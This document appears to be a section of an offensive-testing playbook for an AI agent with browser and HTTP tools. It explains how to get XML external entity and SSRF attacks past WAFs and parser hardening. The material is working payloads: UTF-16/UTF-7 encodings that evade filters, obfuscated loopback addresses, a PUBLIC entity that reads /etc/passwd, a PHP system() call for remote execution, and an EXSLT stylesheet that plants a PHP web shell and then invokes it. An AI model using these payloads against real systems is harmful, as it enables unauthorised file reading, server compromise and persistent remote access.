# Parser & WAF bypasses (XML)

When a textbook payload is filtered or the parser resists, before giving up:

## Get past a WAF / string filter
- **Encoding**: submit the doc as UTF-16 (LE/BE with BOM) or UTF-7 and set the
  matching `encoding=` in the XML declaration — signature WAFs matching ASCII
  `<!ENTITY`/`SYSTEM` miss it while the parser still reads it. Build the bytes in
  `browser_evaluate_js` and send via `http_request`.
- **Whitespace / newlines** between DOCTYPE tokens (`<!DOCTYPE` itself is
  case-sensitive, but the internal subset tolerates padding).
- **SSRF target obfuscation**: decimal `http://2130706433/`, octal
  `http://0177.0.0.1/`, `http://[::1]/`, `http://127.0.0.1.nip.io/`, userinfo
  `http://expected-host@127.0.0.1/`, or a redirect you control.

## Get past parser hardening
- **General entities disabled but parameter entities allowed** → use the `%`-entity
  / external-DTD path from `30` instead of `&`-entities.
- **Your DOCTYPE is stripped** but you control an element → XInclude (`30`).
- **`SYSTEM` blocked but `PUBLIC` allowed** →
  `<!ENTITY x PUBLIC "-//x//x" "file:///etc/passwd">`.
- **libxml network off** → you can still read local files; drop OOB, use in-band
  error-based (`30`).
- **Content-Type pinned to JSON** → some frameworks still sniff a `<?xml` body; try
  the XML body under the JSON `Content-Type`, or a `Content-Type` the endpoint's
  WSDL declares.

## open_basedir blocks reads, not exec or writes
PHP's `open_basedir` restricts filesystem-touching calls (`fopen`,
`document()`, `php://filter`) to a directory whitelist — it does NOT restrict
process execution or the XSLT processor's own write extension. If every
`document()`/`unparsed-text()` read in `50` errors "not allowed in ... open_basedir":
- Pivot straight to RCE: `php:function('system','id')` (`50`) still fires —
  exec is unrestricted even when every read path is blocked.
- Or write inside the whitelist (usually the docroot, reachable over HTTP) via
  EXSLT document-write, then fetch it:
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
    <xsl:template match="/"><exsl:document href="shell.php" method="text">
    &lt;?php system($_GET['c']); ?&gt;</exsl:document></xsl:template>
  </xsl:stylesheet>
  then `http_request`/`browser_navigate` to `shell.php?c=id`. Needs the write
  extension enabled (libxslt/PHP `XSLTProcessor` default — blocked only if the
  app calls `setSecurityPrefs(XSL_SECPREF_WRITE_FILE)`).

Reminder: none of these justify a DoS. Prove the bypass with a file-read or SSRF
differential, not by crashing the parser.
